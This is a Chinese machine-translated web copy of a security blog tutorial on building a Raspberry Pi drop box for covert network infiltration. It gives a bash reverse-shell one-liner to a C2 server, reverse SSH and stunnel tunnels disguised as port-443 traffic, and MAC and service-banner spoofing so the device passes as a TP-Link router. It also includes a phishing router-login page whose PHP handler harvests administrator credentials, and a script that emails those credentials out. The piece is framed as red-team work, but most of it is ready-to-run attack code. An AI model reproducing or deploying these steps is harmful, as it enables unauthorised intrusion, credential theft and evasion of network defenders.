<html>
<head>
<title>Infiltration in local network with Raspberry Pi (creating tunnel)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用树莓皮渗入本地网络(创建隧道)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/infiltration-in-local-network-with-raspberry-pi-creating-tunnel-c72b0880146d?source=collection_archive---------2-----------------------#2022-12-30">https://infosecwriteups.com/infiltration-in-local-network-with-raspberry-pi-creating-tunnel-c72b0880146d?source=collection_archive---------2-----------------------#2022-12-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/d6b03114dad208cb1497c0769d298db5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fdeHm6R0Y7nAvEaSY8pvzg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">覆盆子Pi3，带3D打印表壳</figcaption></figure><p id="1c1f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我将向你展示，我是如何用raspberry Pi制作黑客小工具的，你可以通过以太网电缆或Wi-Fi适配器将其渗透到网络中。这个小工具可以通过电源适配器或电池供电，这使得它更加便携。一旦连接到网络，它会自动创建到C2服务器的加密隧道(SSH/TLS，端口443 ),因此您可以在世界的任何地方通过shell控制这个小工具。除了避免容易发现，我试图掩盖小工具，看起来像路由器。我更改了MAC地址，隐藏了SSH版本，并将apache服务名改为routers one。还包括真实路由器登录设置页面的钓鱼页面。它的证书通过电子邮件发送。Gadget还包括Wi-Fi接入点，让您可以选择使用ssh协议通过电话或PC来控制它。这是实际的情况下，如果你想渗透小工具通过无线网络，你不知道它的密码，直到渗透测试开始现场。这个小玩意很适合红队队员。</p><p id="1fa7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们从解释我是如何做到的开始。</p><p id="3f40" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">硬件:</strong></p><p id="5514" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我使用的是Raspberry Pi 3(安装了Linux Raspbian bullseye Lite)，它内置了以太网适配器(eth0)和Wi-Fi适配器(wlan0)。因此，任何这种适配器被用来连接在受攻击的网络。然后，我添加了外部USB天线，这是用于Wi-Fi接入点(wlan1)。为了能够用电池供电，我添加了Lipo电池充电器TP4056和DC-DC升压转换器。当然，也可以通过适配器供电。我还添加了电源按钮、LED状态和禁用Wi-Fi接入点的按钮。所有的东西都被放进了围栏里，这是我3D设计和制作的。</p><p id="d1cf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">候机楼:</strong></p><p id="c9c7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> 1。将小工具连接到C2服务器</strong></p><p id="ceb7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我将向您展示执行隧道的三种不同方式。通过TCP协议、SSH协议和SSH/SSL隧道。TCP协议是技术上最简单的方法，而SSH和SSH/SSL稍微难一点。但是不要害怕这不是一门火箭科学。</p><p id="4057" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">方法1 —使用TCP协议创建隧道</strong></p><p id="b50f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这是在Raspberry Pi和C2服务器之间创建隧道的最简单的方法，因此你可以在服务器上控制Pi。</p><p id="856d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在树莓Pi和C2服务器上，我们只需要一行命令。</p><p id="cc38" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">关于树莓派:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="293c" class="lj lk iq lf b be ll lm l ln lo">sudo bash -i &gt;&amp; /dev/tcp/&lt;C2 Server IP&gt;/5555 0&gt;&amp;1</span></pre><p id="010a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">在C2服务器上:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="3296" class="lj lk iq lf b be ll lm l ln lo">nc -vv -l -p 5555</span></pre><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lp"><img src="../Images/8b8ed1f24fa321b66793ff687751d1ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S_-7bP4E1EPWApBRgi2AzQ@2x.jpeg"/></div></div></figure><p id="2977" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我会使用这种方法，当我知道攻击网站没有任何系统管理员，也没有在安全方面投入太多精力。您需要知道TCP流量是不加密的，因此很容易被捕获和检测到。</p><p id="ca28" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">因此，在接下来的文章中，我将向您展示一种使用SSH协议的稍微安全的方法。一旦Raspberry Pi和C2服务器之间建立了连接，它们之间传输的数据就会被加密。</p><p id="63a7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">方法2 —使用SSH协议创建隧道</strong></p><p id="8cbf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为此，我们需要创建基于密钥的认证，这将使我们能够获得Raspberry Pi和C2服务器之间的SSH连接。</p><p id="c535" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在Raspberry Pi上，我们将使用<strong class="ke ir"> ssh-keygen </strong>，它将创建公钥和私钥:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="4436" class="lj lk iq lf b be ll lm l ln lo">sudo ssh-keygen -f ~/.ssh/vps -t rsa -N ""</span></pre><p id="f9ac" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">复制公钥的输出(本例中公钥是<strong class="ke ir"> vps.pub </strong>)并将其内容粘贴到<strong class="ke ir"> /root/中的<strong class="ke ir"> authorized_keys </strong>中。C2服务器上的ssh </strong>目录，并重新启动ssh服务:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="cdb9" class="lj lk iq lf b be ll lm l ln lo">service ssh restart</span></pre><p id="71b2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">测试ssh连接:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="3379" class="lj lk iq lf b be ll lm l ln lo">sudo ssh -i /home/pi/.ssh/vps root@&lt;C2 Server IP&gt;</span></pre><p id="9887" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">因此，由于SSH协议设置正确，我们可以通过运行以下命令将所有连接从Raspberry Pi隧道传输到C2服务器:</p><p id="11cd" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">关于树莓派:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="15a9" class="lj lk iq lf b be ll lm l ln lo">sudo ssh -i /root/.ssh/vps -nNT -R 5555:localhost:22 &lt;C2 Server IP&gt;</span></pre><p id="2401" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">在C2服务器上:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="bb0a" class="lj lk iq lf b be ll lm l ln lo">ssh pi@localhost -p 5555</span></pre><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lq"><img src="../Images/04a4ea4610679c0b16bcdcd251ee34d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*or-PTh1-OWGilmK3K1gytA.jpeg"/></div></div></figure><p id="c892" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">好的。现在，由于我们经历了两种不同的隧道方法(TCP和SSH协议)，我将简要地向您解释，为什么我包括和使用下一种方法(SSH/SLL)。</p><p id="47e0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们想象一下，我们将攻击某个大公司，该公司的IT部门也有系统管理员，他们使用某种IDS、IPS和FW来进行深度数据包检查、定期扫描等。在这类公司中，网络通常会阻塞端口22。此外，如果您通过端口443进行SSH，他们的系统会识别并丢弃流量。这就是我选择stunnel的原因，这样我就可以建立看起来像SSL流量的SSH连接隧道。我在端口443上建立了SSL隧道，所以它看起来像正常的SSL流量，因此FW将允许流量。</p><p id="781a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">方法3 —使用SSH/SSL创建隧道</strong></p><p id="3274" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">首先，我们需要在Raspberry Pi上生成私有和公共密钥，并将公共密钥放在C2服务器上，就像我们在前面的方法(SSH)中所做的那样。</p><p id="b9c6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">设置树莓Pi: </strong></p><p id="b08a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">安装stunnel: </strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="6552" class="lj lk iq lf b be ll lm l ln lo">apt-get install stunnel4</span></pre><p id="6d5d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">安装autosh:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="20ec" class="lj lk iq lf b be ll lm l ln lo">apt-get install autossh</span></pre><p id="6479" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">之后，我们需要创建stunnel配置文件<strong class="ke ir">/etc/stunnel/stunnel . conf</strong>并添加以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="8188" class="lj lk iq lf b be ll lm l ln lo">pid = /var/run/stunnel.pid<br/>client=yes<br/>[ssh]<br/>accept = 443<br/>connect = &lt;C2 Server IP&gt;:443</span></pre><p id="8122" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们需要确保隧道将自动启动。在<strong class="ke ir"> /etc/default/stunnel4 </strong>文件中添加以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="fb36" class="lj lk iq lf b be ll lm l ln lo">ENABLED=1</span></pre><p id="c793" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">然后，我们需要通过创建文件<strong class="ke ir">/etc/network/if-up . d/auto shh</strong>，使Raspberry Pi能够在网络接口出现时自动建立SSH隧道。添加以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="a736" class="lj lk iq lf b be ll lm l ln lo">#!/bin/bash<br/>sudo su -c "autossh -p 443 -f -N -R *:2222:localhost:22 root@localhost -o LogLevel=error -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no" pi</span></pre><p id="20cd" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">并且在启动时启动并启用服务:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="1080" class="lj lk iq lf b be ll lm l ln lo">sudo systemctl start stunnel4<br/>sudo systemctl enable stunnel4<br/>sudo systemctl daemon-reload</span></pre><p id="2e1c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">设置VPS服务器:</strong></p><p id="4b7c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">安装stunnel: </strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="201b" class="lj lk iq lf b be ll lm l ln lo">apt-get install stunnel4</span></pre><p id="c43e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">开放端口:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="0142" class="lj lk iq lf b be ll lm l ln lo">ufw enable<br/>ufw allow 22<br/>ufw allow 443</span></pre><p id="0c1e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">由于我们将在SSL (HTTPS)流量上隧道传输SSH流量，我们需要生成另一个密钥，用于加密和解密SSL流量:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="b27b" class="lj lk iq lf b be ll lm l ln lo">openssl genrsa 2048 &gt; /etc/stunnel/stunnel.key<br/>openssl req -new -key /etc/stunnel/stunnel.key -x509 -days 365 -out /etc/stunnel/stunnel.crt<br/>cat /etc/stunnel/stunnel.crt /etc/stunnel/stunnel.key &gt; /etc/stunnel/stunnel.pem</span></pre><p id="6550" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">之后，我们需要创建stunnel配置文件<strong class="ke ir">/etc/stunnel/stunnel . conf</strong>，并添加以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="68d4" class="lj lk iq lf b be ll lm l ln lo">pid = /var/run/stunnel.pid<br/>cert = /etc/stunnel/stunnel.pem<br/>[ssh]<br/>accept = 443<br/>connect = 127.0.0.1:22</span></pre><p id="3ae8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们需要确保隧道将自动启动并监听端口443。在<strong class="ke ir"> /etc/default/stunnel4 </strong>文件中添加以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="0e26" class="lj lk iq lf b be ll lm l ln lo">ENABLED=1</span></pre><p id="6050" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">启动时也启动并启用服务:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="30b0" class="lj lk iq lf b be ll lm l ln lo">sudo systemctl start stunnel4<br/>sudo systemctl enable stunnel4<br/>sudo systemctl daemon-reload</span></pre><p id="42e3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">最后，重启C2服务器。</p><p id="d651" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">就是这样。要控制Raspberry Pi，请在C2服务器上运行以下命令:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="97f5" class="lj lk iq lf b be ll lm l ln lo">ssh -p 2222 pi@localhost</span></pre><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lr"><img src="../Images/c5ccd3df91aef64e782bfb03d7b004ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YwT9WBQppyPx8e7rWdkDaw.png"/></div></div></figure><p id="5c2c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我向你解释了三种不同的方法，你可以通过C2服务器远程控制Raspberry Pi，从而在世界的任何地方控制它。我的建议是在任何情况下都坚持最后一种SSH/SSL方法。</p><p id="0b5f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">当你潜入某个严肃的网络，那里有很好的安全团队，系统管理员以正确的方式工作，这只是一个时间问题，他们会发现你的黑客工具。我的意思是，当系统管理员定期扫描网络时，他发现了新设备raspberry pi。我想我们都可以想象他脸上的表情。所以把圆周率伪装成别的东西是非常聪明的；像打印机，路由器，windows pc等。这样肯定会引发更少的关注。</p><p id="ba71" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在我的例子中，我把Raspberry pi伪装成路由器的样子。它看起来像TP-Link路由器。我还为路由器设置页面创建了钓鱼页面，目的是捕捉管理员的凭证，以防他/她找到我并试图登录。我还设置了将收集到的凭证发送到我的电子邮件中。</p><p id="a04e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">首先，我将两个适配器(eth0和wlan1)的MAC地址转换为通用的TP-Link地址:</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="7819" class="lj lk iq lf b be ll lm l ln lo">sudo apt install macchanger</span></pre><p id="b64c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我创建了bash脚本(<strong class="ke ir"> mac.sh </strong>)并放入<strong class="ke ir"> /etc/rc.local </strong>，所以它会在每次引导或重启时更改mac地址。</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="c6d4" class="lj lk iq lf b be ll lm l ln lo">#!/bin/bash<br/>sudo ifconfig eth0 down<br/>sudo macchanger -m f8:d1:11:2a:24:a3 eth0<br/>sudo ifconfig eth0 up<br/><br/>sudo ifconfig wlan1 down<br/>sudo macchanger -m f8:d1:11:2a:24:a4 wlan1<br/>sudo ifconfig wlan1 up</span></pre><p id="8f38" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">改变端口22和80上的服务名称</strong></p><p id="93db" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">对于端口22，你应该在ssh上隐藏debian版本，这样路由器和debian发行版之间的关联就不会看起来可疑。为此，在<strong class="ke ir"> /etc/ssh/sshd_config </strong>中添加以下行</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="d723" class="lj lk iq lf b be ll lm l ln lo">DebianBanner no</span></pre><p id="fb42" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">接下来，更改apache2服务名。为什么我们要改变它。当您在路由器上执行扫描时，通常不会看到apache服务在端口80上运行。所以我把它改成了<strong class="ke ir">TP-LINK wr 841n WAP http config</strong>。</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="94b1" class="lj lk iq lf b be ll lm l ln lo">sudo apt install apache2<br/>sudo apt install -y php<br/>sudo apt install -y php-{common,mysql,xml,xmlrpc,curl,gd,imagick,cli,dev,imap,mbstring,opcache,soap,zip,intl}</span></pre><pre class="ls le lf lg bn lh li bi"><span id="5f1c" class="lj lk iq lf b be ll lm l ln lo">sudo systemctl restart apache2</span></pre><pre class="ls le lf lg bn lh li bi"><span id="a373" class="lj lk iq lf b be ll lm l ln lo">sudo apt install libapache2-mod-security2<br/>sudo a2enmod security2</span></pre><p id="0170" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在文件<strong class="ke ir">/etc/Apache 2/conf-enabled/security . conf</strong>中添加/更改以下内容:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="5ea7" class="lj lk iq lf b be ll lm l ln lo">ServerTokens Full<br/>SecServerSignature "TP-LINK WR841N WAP http config"<br/>ServiceSignature Off</span></pre><p id="4cf6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">创建钓鱼页面—路由器设置页面</strong></p><p id="99f2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">使用WebScrpBook插件捕获页面源代码，并将其放入<strong class="ke ir"> /var/www/html </strong>。</p><p id="8873" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在那之后修改了<strong class="ke ir">index.html</strong>的文件。您应该通过在表单部件中添加/更改action来修改它(action="action.php ")。</p><p id="90d0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">创建<strong class="ke ir">action.php</strong>文件并保存在<strong class="ke ir"> /var/www/html </strong>中。</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="87c3" class="lj lk iq lf b be ll lm l ln lo">&lt;?php<br/>$location='/error';<br/>header("Location: " . "http://" . $_SERVER['HTTP_HOST'] . $location);<br/>$handle = fopen("pass.txt", "a");<br/>foreach($_POST as $variable =&gt; $value) {<br/>fwrite($handle, $variable);<br/>fwrite($handle, "=");<br/>fwrite($handle, $value);<br/>fwrite($handle, "\r\n");<br/>}<br/>fwrite($handle, "\r\n\n\n\n");<br/>fclose($handle);<br/>exit;<br/>?&gt;</span></pre><p id="171a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">因此，在这段代码中，你可以看到登录后，它会将你重定向到<strong class="ke ir"> /error </strong>文件夹。在此文件夹中，您可以创建新的index.html文件<strong class="ke ir">，该文件将显示您无权访问此路由器。所有采集的凭证将保存在<strong class="ke ir"> pass.txt </strong>文件中。</strong></p><p id="6e9e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">你可以在我的<strong class="ke ir"> </strong> <a class="ae lt" href="https://github.com/pr0xy-8L4d3/TP-Link_phishing_page" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> github页面</strong> </a>找到整个钓鱼页面TP-Link路由器。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lu"><img src="../Images/e60c69e4ca340a03716f1e917104d325.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YoQxMm8M8Ga6DuZcK7zfMw.png"/></div></div></figure><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lu"><img src="../Images/b80525402b3f0b66ab9b3bb209520727.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d1vRAWUmhEAuZ1AmO3m0pQ.png"/></div></div></figure><p id="bf7c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">设置电子邮件以接收收集的凭证</strong></p><p id="bf99" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">要在您的电子邮件中接收收集的凭据，您可以使用Msmtp (SMTP)。</p><p id="9985" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">现在，您需要创建脚本，并使其在启动时运行，它将每20秒检查一次pass.txt文件是否存在，如果存在，它将从中提取用户名和密码并发送到您的电子邮件。</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="a9f4" class="lj lk iq lf b be ll lm l ln lo">#!/bin/bash<br/>while sleep 20<br/>do<br/>if [ -f /var/www/html/pass.txt ]<br/>then grep -e user -e pass /var/www/html/pass.txt | msmtp - debug - from=default -t example@email.com<br/>rm -f /var/www/html/pass.txt<br/>fi<br/>done</span></pre><p id="d8cf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">创建Wi-Fi接入点</strong></p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="f774" class="lj lk iq lf b be ll lm l ln lo">sudo git clone https://github.com/oblique/create_ap<br/>cd create_ap<br/>sudo make install</span></pre><p id="469d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">要创建WI-Fi接入点，请运行以下命令:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="ebf8" class="lj lk iq lf b be ll lm l ln lo">sudo create_ap -n wlan1 MyAccessPoint MyPassPhrase --no-virt</span></pre><p id="2351" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为了在每次启动时创建AP，我创建了服务<strong class="ke ir">/etc/systemd/system/AP . service</strong>:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="6994" class="lj lk iq lf b be ll lm l ln lo">Unit]<br/>Description=Run script with systemd<br/>[Service]<br/>ExecStart=sudo create_ap -n wlan1 MyAccessPoint MyPassPhrase --no-virt<br/>Restart=always<br/>TimeoutStartSec=20<br/>RestartSec=20<br/>[Install]<br/>WantedBy=multi-user.target</span></pre><p id="cd77" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">要启用服务运行:</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="a649" class="lj lk iq lf b be ll lm l ln lo">sudo systemctl enable ap.service<br/>sudo systemctl daemon-reload</span></pre></div><div class="ab cl lv lw hu lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="ij ik il im in"><h2 id="f4b9" class="mc lk iq bd md me mf dn mg mh mi dp mj kn mk ml mm kr mn mo mp kv mq mr ms mt bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lt" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>